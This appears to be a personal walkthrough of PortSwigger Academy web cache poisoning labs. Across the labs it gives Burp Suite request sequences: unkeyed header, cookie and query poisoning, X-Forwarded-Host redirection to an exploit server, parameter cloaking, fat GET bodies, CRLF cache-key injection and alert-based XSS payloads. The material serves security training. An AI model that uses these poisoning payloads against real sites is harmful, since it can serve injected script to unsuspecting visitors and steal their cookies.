# Portswigger
## Web Cache Poisoning
### Web cache poisoning with an unkeyed header
```bash

# This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 


Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater

Change:

GET / HTTP/1.1

To

GET /?cb=1234 HTTP/1.1

Add:

X-Forwarded-Host: check.com

Like so:

GET /?cb=1234 HTTP/1.1
Host: 0afc008604ffa3ecc08371a7007400ee.web-security-academy.net
X-Forwarded-Host: check.com

Send the request
Response:

X-Cache: hit

<script type="text/javascript" src="//check.com/resources/js/tracking.js">

Go to: "Go to exploit server"

File:

/exploit

To

/resources/js/tracking.js

Body:

alert(document.cookie)

Store

Go to: Repeater
Change:

GET /?cb=1234 HTTP/1.1

To

GET / HTTP/1.1

Change:

X-Forwarded-Host: check.com

To

exploit-0ad500300419a363c0ec7103014a0001.web-security-academy.net

Send
Ensure the response includes:

X-Cache: hit

Go to:

https://0afc008604ffa3ecc08371a7007400ee.web-security-academy.net/

Refresh the page

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603011922.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603012804.png)

### Web cache poisoning with an unkeyed cookie
```bash

# This lab is vulnerable to web cache poisoning because cookies aren't included in the cache key. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes alert(1) in the visitor's browser. 

Go to: HTTP history 
Find:

GET / HTTP/1.1

Note the cookie parameter:

Cookie: session=jql43W1505VvJoWw3x54qw13xgUH0Q6M; fehost=prod-cache-01

Response:

<script>
	data = {
		"host":"0a9c00110483decbc0288a9e00e300d9.web-security-academy.net",
		"path":"/",
		"frontend":"prod-cache-01"
	}
</script>

Send to repeater

Change:

GET / HTTP/1.1

To

GET /?cb=1234 HTTP/1.1

Change:

Cookie: session=jql43W1505VvJoWw3x54qw13xgUH0Q6M; fehost=prod-cache-01

To

Cookie: session=jql43W1505VvJoWw3x54qw13xgUH0Q6M; fehost="-alert(1)-"

Response:

<script>
	data = {
		"host":"0a9c00110483decbc0288a9e00e300d9.web-security-academy.net",
		"path":"/",
		"frontend":""-alert(1)-""
	}
</script>

Change:

GET /?cb=1234 HTTP/1.1

To

GET / HTTP/1.1

Send
Ensure the response includes:

X-Cache: hit

Go to:

https://0a9c00110483decbc0288a9e00e300d9.web-security-academy.net/

Refresh the page

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603015044.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603015202.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603015806.png)

### Web cache poisoning with multiple headers
```bash

# This lab contains a [web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning) vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Note the two script source files in the body of the response:

<script type="text/javascript" src="/resources/js/tracking.js"></script>
<script src="/resources/labheader/js/labHeader.js"></script>

To to Target -> Site map - current_website.com -> resources -> tracking.js -> Send to repeater
Right-click -> Extensions -> Param Miner -> Guess params -> Guess headers -> Ok
Go to:

GET /resources/js/tracking.js HTTP/1.1

Change to:

GET /resources/js/tracking.js?cb=1234 HTTP/1.1

Add:

X-Forwarded-Host: check.com

Nothing

Add: 

X-Forwarded-Scheme: nothttps

Response:

Location: https://check.com/resources/js/tracking.js?cb=1234

Go to: "Go to exploit server"
File:

/resources/js/tracking.js

Body:

alert(document.cookie)

Store

Go to: 

GET /resources/js/tracking.js?cb=1234 HTTP/1.1

Change to:

GET /resources/js/tracking.js HTTP/1.1

Send

Ensure the response includes:

X-Cache: hit

Refresh:

https://exploit-0a5f00eb04f2c5c9c0c6ab95012800a7.web-security-academy.net/

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603203852.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603203923.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603203500.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603203706.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603204955.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603205333.png)

### Targeted web cache poisoning using an unknown header
```bash

# This lab is vulnerable to [web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning). A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Right-click -> Extensions -> Param Miner -> Guess params -> Guess headers -> Ok
Go to: Target -> Issues
Issue details:

'Cache poisoning: 'x-host'. Disregard the request and look for zwrtxqva in the response'

Copy:

zwrtxqva

Go to response
Ctrl+f
Paste
Response:

<script type="text/javascript" src="//zwrtxqvalef3em2biq/resources/js/tracking.js"></script>

Go to the request tab
Send to repeater

Change:

GET /?kahxa1x2m1=1 HTTP/1.1

To

GET /?kahxa1x2m1=1&cb=1234 HTTP/1.1

(This should actually be two counter-balance parameters, but it does not hurt)

Add:

X-Host: check.com

Send
Response:

<script type="text/javascript" src="//check.com/resources/js/tracking.js"></script>

Go to: "Go to exploit server"
File:

/resources/js/tracking.js

Body:

alert(document.cookie)

Store

exploit-0ae0002f03aad178c07d4fbf01ae00ae.web-security-academy.net

Go to:

https://0af1009d03e1d1fdc0834fb3007e0016.web-security-academy.net/post?postId=3

Acknowledge that the comment field says 'HTML is allowed'
Comment:

<img src='https://exploit-0ae0002f03aad178c07d4fbf01ae00ae.web-security-academy.net/clickme' />

Name:

name

Email:

email@email.com

Post Comment

Go to: "Go to exploit server"
View logs
Note the new IP user-agent
Go to: Repeater
Change:

GET /?kahxa1x2m1=1&cb=1234 HTTP/1.1

To

GET / HTTP/1.1

Change:

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 kahxa1x2m1

To

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36

Ensure X-Host is:

X-Host: exploit-0ae0002f03aad178c07d4fbf01ae00ae.web-security-academy.net

Send
Ensure the response includes:

X-Cache: hit

Go to:

https://0a3c00460408c1edc00502c300d700f5.web-security-academy.net/

Refresh the page

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603213055.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603213122.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603213150.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603213022.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603214621.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603215401.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603223758.png)

### Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria
```bash

# This lab contains a DOM-based vulnerability that can be exploited as part of a web cache poisoning attack. A user visits the home page roughly once a minute. Note that the cache used by this lab has stricter criteria for deciding which responses are cacheable, so you will need to study the cache behavior closely.

# To solve the lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Right-click -> Extensions -> Param Miner -> Guess params -> Guess headers -> OK
Go to: Target -> Issues
Issue details:

'Cache poisoning: 'x-forwarded-host'. Disregard the request and look for zwrtxqva in the response'

Go to: Repeater
Add:

X-Forwarded-Host: check.com

Response:

<script>
	data = {
		"host":"check.com",
		"path":"/",
	}
</script>

Go to: Target -> Site map -> current_website.com -> resources -> geolocate.js

function initGeoLocate(jsonUrl)
{
    fetch(jsonUrl)
        .then(r => r.json())
        .then(j => {
            let geoLocateContent = document.getElementById('shipping-info');

            let img = document.createElement("img");
            img.setAttribute("src", "/resources/images/localShipping.svg");
            geoLocateContent.appendChild(img)

            let div = document.createElement("div");
            div.innerHTML = 'Free shipping to ' + j.country;
            geoLocateContent.appendChild(div)
        });
}

Go to: "Go to exploit server"
File:

/resources/json/geolocate.json

Head:

HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
Access-Control-Allow-Origin: *

Body:

{
"country": "<img src=1 onerror=alert(document.cookie) />"
}

Store
Go to: Repeater
Change:

X-Forwarded-Host: check.com

To

X-Forwarded-Host: exploit-0a02004103861dd5c0beb48001d500f3.web-security-academy.net

Send
Ensure the response includes:

X-Cache: hit

Go to:

https://0a3c00460408c1edc00502c300d700f5.web-security-academy.net/

Refresh the page (Continuously)

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603233446.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603225656.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603231238.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603231142.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603233151.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220603233250.png)

### Combining web cache poisoning vulnerabilities
```bash

# This lab is susceptible to web cache poisoning, but only if you construct a complex exploit chain.

# A user visits the home page roughly once a minute and their language is set to English. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Right-click -> Extensions -> Param Miner -> Guess params -> Guess headers -> Ok
Go to: Target -> Issues
Issue details:

'Cache poisoning: 'x-forwarded-host'. Disregard the request and look for zwrtxqva in the response'

'Found unlinked param: x-original-url~/%s'

Go to: Repeater
Add:

X-Forwarded-Host: check.com

Response:

<script>
	data = {
		"host":"check.com",
		"path":"/",
	}
</script>

Go to: Target -> Site map -> current_website.com -> resources -> js -> translations.js

function initTranslations(jsonUrl)
{
    const lang = document.cookie.split(';')
        .map(c => c.trim().split('='))
        .filter(p => p[0] === 'lang')
        .map(p => p[1])
        .find(() => true);

    const translate = (dict, el) => {
        for (const k in dict) {
            if (el.innerHTML === k) {
                el.innerHTML = dict[k];
            } else {
                el.childNodes.forEach(el_ => translate(dict, el_));
            }
        }
    }

    fetch(jsonUrl)
        .then(r => r.json())
        .then(j => {
            const select = document.getElementById('lang-select');
            if (select) {
                for (const code in j) {
                    const name = j[code].name;
                    const el = document.createElement("option");
                    el.setAttribute("value", code);
                    el.innerText = name;
                    select.appendChild(el);
                    if (code === lang) {
                        select.selectedIndex = select.childElementCount - 1;
                    }
                }
            }

            lang in j && lang.toLowerCase() !== 'en' && j[lang].translations && translate(j[lang].translations, document.getElementsByClassName('maincontainer')[0]);
        });
}

Right-click current_website.com -> Engagement tools -> Discover content -> Session is not running
Find:
Go to: Target -> Site map -> current_website.com -> resources -> json -> translation.json
Send to repeater
Send
Go to: "Go to exploit server"
File:

/resources/json/translations.json

Head:

HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
Access-Control-Allow-Origin: *

Body:

{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "</a><img src=1 onerror='alert(document.cookie)' />",
            "View details": "Ver detailes",
            "Description:": "Descripción:"
        }
    }
}

Store
Go to:

https://0a790006046af379c07798f1002c009d.web-security-academy.net/

Change the language drop-down menu:

Spanish
Go to: HTTP history
Find:

https://0a790006046af379c07798f1002c009d.web-security-academy.net/?localized=1

Note the session cookie:

Cookie: session=2SOKY4bpQJnL9Sy57Qe0eXpXkMLIbbUl; lang=es

Send to repeater
Find:

GET /setlang/es HTTP/1.1

Send to repeater
Send
Response:

Location: /?localized=1

Add:

X-Original-URL: /setlang\es

Send
Response:

Location: /setlang/es

Go to: Repeater
Find:

GET /?localized=1 HTTP/1.1

Make sure it is pointing to exploit server:

x-forwarded-host: exploit-0a0b000d0457f355c0ce980901370004.web-security-academy.net

Go to:

Location: /?localized=1

Change 

GET /setlang/es HTTP/1.1

To

GET / HTTP/1.1

Ensure the X-Original-URL is present like so:

X-Original-URL: /setlang\es

Fire both requests off simultaneously

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604004318.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604005218.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604005242.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604005338.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604005846.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604005905.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604010750.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604011237.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604011259.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604014615.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604014713.png)

### Web cache poisoning via an unkeyed query string
```bash

# This lab is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site's home page using Chrome.

# To solve the lab, poison the home page with a response that executes alert(1) in the victim's browser. 

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Right-click request -> Extensions -> Param Miner -> Guess params -> Guess headers (not required)
Check the top-left box:

"Add 'fcbz' cachebuster"

OK

Go to: Target -> Issues

GET /?of5z4a4kt42=1 HTTP/1.1

Response:

HTTP/1.1 200 OK

Copy:

"of5z4a4kt42"

Go to Response
Ctrl+f
Paste:

of5z4a4kt42

Go to: Repeater
Right-click request -> Extensions -> Param Miner -> Guess params -> Guess headers (disable if previously enabled)
Craft a response to escape the <href> tag

GET /?'/><script>alert(1)</script> HTTP/1.1

Send
Ensure the response includes:

X-Cache: hit

Go to:

https://0ac2006d0394a205c0600d7100550056.web-security-academy.net/

Refresh the page

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604031104.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604031132.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604030525.png)

### Web cache poisoning via an unkeyed query parameter
```bash

# This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. A user regularly visits this site's home page using Chrome.

# To solve the lab, poison the cache with a response that executes alert(1) in the victim's browser. 

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Right-click request -> Extensions -> Param Miner -> Guess params -> Guess headers (not required)
Check the top-left box:

"Add 'fcbz' cachebuster"

OK

Go to: Target -> Issues

GET /?gici97=1 HTTP/1.1

Response:

HTTP/1.1 200 OK

Copy:

"gici97"

Go to Response
Ctrl+f
Paste:

gici97

Go to: Repeater
Right-click request -> Extensions -> Param Miner -> Guess params -> Guess headers (disable if previously enabled)
Craft a response to escape the <href> tag

GET /?utm_content='/><script>alert(1)</script> HTTP/1.1

Initially I achieved XSS on:

GET /post?postId=7&'/><script>alert(1)</script> HTTP/1.1

Solving the lab seems to work only if triggered on the main page
The hint infers using the utm parameter
The script should would without the parameter as well
Like so:

GET /?'/><script>alert(1)</script> HTTP/1.1

Send
Ensure the response includes:

X-Cache: hit

Go to:

https://0aa800d903a4d168c0067e18002a003f.web-security-academy.net/

Refresh the page

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604032746.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604032815.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604034006.png)

### Parameter cloaking
```bash

# This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. There is also inconsistent parameter parsing between the cache and the back-end. A user regularly visits this site's home page using Chrome.

# To solve the lab, use the parameter cloaking technique to poison the cache with a response that executes alert(1) in the victim's browser. 


Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Right-click request -> Extensions -> Param Miner -> Param Miner -> rails param cloacking scan
OK

Go to: Target -> Issues

"Web Cache Poisoning: Parameter Cloaking"

GET /?test=1234&utm_content=x;test=akzldka&sxwt3=1 

Response:

HTTP/1.1 200 OK

<link rel="canonical" href='//0a1800980427a98ec01914fe004a005b.web-security-academy.net/?test=1234&amp;utm_content=x;test=akzldka&amp;sxwt3=1'/>
       
Go to: Target -> Site map -> js -> geolocate.js -> callback=setCountryCookie

const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
setCountryCookie5({"country":"United Kingdom"}

Send to repeater

Change:

GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1

To

GET /js/geolocate.js?callback=setCountryCookie5 HTTP/1.1

Response:

X-Cache: hit

setCountryCookie5({"country":"United Kingdom"});

Change:

GET /js/geolocate.js?callback=setCountryCookie5 HTTP/1.1

To

GET /js/geolocate.js?callback=setCountryCookie&utm_content=1234;callback=alert(1) HTTP/1.1

Send
Ensure the response includes:

X-Cache: hit

Go to:

https://0a1800980427a98ec01914fe004a005b.web-security-academy.net

Refresh the page

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604210506.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604210600.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604210622.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604210658.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604210721.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604212509.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604212349.png)

### Web cache poisoning via a fat GET request
```bash

# This lab is vulnerable to web cache poisoning. It accepts GET requests that have a body, but does not include the body in the cache key. A user regularly visits this site's home page using Chrome.

# To solve the lab, poison the cache with a response that executes alert(1) in the victim's browser. 

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Change:

GET / HTTP/1.1

To

GET /?check=1234 HTTP/1.1

Response:

X-Cache: hit

<link rel="canonical" href='//0a03001804e10b28c0f2020f00400051.web-security-academy.net/?check=1234'/>

Add to body:

check=<script>alert(1)</script>

Response:

HTTP/1.1 200 OK

X-Cache: hit

Go to: Target -> Site map -> js -> geolocate.js -> callback=setCountryCookie

const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
setCountryCookie5({"country":"United Kingdom"}

Send to repeater

Change:

GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1

To

GET /js/geolocate.js?callback=setCountryCookie5 HTTP/1.1

Response:

X-Cache: hit

setCountryCookie5({"country":"United Kingdom"});

Change:

GET /js/geolocate.js?callback=setCountryCookie5 HTTP/1.1

To

GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1

(it seems the lab only completes if you remove any additional content from the above 'callback=setCountryCookie')
(The response would not change for a period of time unless I appended the 5 to 'callback=setCountryCookie' along with adding the below content and also ensuring the response contained 'X-Cache: hit')
Add to body:

callback=alert(1)

Send
Ensure the response includes:

X-Cache: hit

Go to:

https://0a03001804e10b28c0f2020f00400051.web-security-academy.net/

Refresh the page

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604213727.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604215004.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604220019.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604220314.png)

### URL normalization
```bash

# This lab contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding.

# To solve the lab, take advantage of the cache's normalization process to exploit this vulnerability. Find the XSS vulnerability and inject a payload that will execute alert(1) in the victim's browser. Then, deliver the malicious URL to the victim. 

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Change:

GET / HTTP/1.1

To

GET /checkcheck HTTP/1.1

Response:

HTTP/1.1 404 Not Found

<p>Not Found: /checkcheck</p>

Change:

GET /checkcheck HTTP/1.1

To

GET /checkcheck<script>alert(1)</script> HTTP/1.1

Response:

HTTP/1.1 404 Not Found

<p>Not Found: /checkcheck<script>alert(1)</script></p>

Right-click response -> Show response in browser -> copy
XXS is achieved

Refresh the cache and ensure response contains:

X-Cache: hit

Right-click response -> Copy URL

Go to:

https://0a65000b041c54bec1a1784700ec0067.web-security-academy.net/

Click "Deliver link to victim"
Paste the copied URL
OK

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604223328.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604223426.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604223500.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604223514.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220604223605.png)

### Cache key injection
```bash

# This lab contains multiple independent vulnerabilities, including cache key injection. A user regularly visits this site's home page using Chrome.

# To solve the lab, combine the vulnerabilities to execute alert(1) in the victim's browser. Note that you will need to make use of the Pragma: x-get-cache-key header in order to solve this lab. 

Refresh the page
Go to: HTTP history
Find:

GET /js/localize.js?lang=en&cors=0 HTTP/1.1

Send to repeater
Change:

GET /js/localize.js?lang=en&cors=0 HTTP/1.1

To

GET /js/localize.js?lang=en&cors=1 HTTP/1.1

Response:

Set-Cookie: session=XtoL0IR2HEwUslxEN99dnKu9HpXXjnL6; Secure; HttpOnly; SameSite=None

Change:

GET /js/localize.js?lang=en&cors=1 HTTP/1.1

To

GET /js/localize.js?lang=en&utm_content=z&cors=1 HTTP/1.1

Note that 'Set-Cookie' is now no longer in the response

Add:

Origin: check.com

Response:

Access-Control-Allow-Origin: check.com
Set-Cookie: session=AKY1vMCIeRovgDBmiE7ue5HNsYpXk1ak; Secure; HttpOnly; SameSite=None
Set-Cookie: utm_content=z; Secure; HttpOnly

Change:

Origin: check.com

To

Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$

Response:

X-Cache: hit

Body:

alert(1)

Change:

GET /js/localize.js?lang=en&utm_content=z&cors=1&x=1 HTTP/1.1
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$

To

GET /login?lang=en?utm_content=x%26cors=1%26x=1$$Origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/1.1

Response:

HTTP/1.1 302 Found

X-Cache: hit

Right-click response -> Show response in browser -> Copy -> Paste in browser

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220605192748.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220605192804.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220605192834.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220605192858.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220605192930.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220605193103.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220605193234.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220605193328.png)

### Internal cache poisoning
```bash

# This lab is vulnerable to web cache poisoning. It uses multiple layers of caching. A user regularly visits this site's home page using Chrome.

# To solve the lab, poison the internal cache so that the home page executes alert(document.cookie) in the victim's browser. 

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Right-click the request -> Extensions -> Param Miner -> Guess params -> Guess headers -> Check "Add 'fcbz' cachebuster"
Go to: Target -> Issues

Found persistent parameter: 'x-forwarded-host'. Disregard the request and look for zwrtxqvav5xuq82tt2 in the response

Go to: Repeater
Right-click the request -> Extensions -> Param Miner -> Guess params -> Guess headers -> Un-check "Add 'fcbz' cachebuster"

Go to: "Go to exploit server"

Copy the URL for the exploit server
Go to: Repeater
Add:

X-Forwarded-Host: exploit-0a20000204d69dfdc008160c019c00f5.web-security-academy.net

Send the request 2-3 times
Go to response and paste the exploit server link in the search box
Notice that following the exploit server link there are the js files appended to it
Copy /js/geolocate.js
Go to: "Go to exploit server"
File:

/js/geolocate.js

Body:

alert(document.cookie)

Store
Go to: Repeater
Send (Numerous times)

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220605195145.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220605200424.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220605201107.png)

#hacking
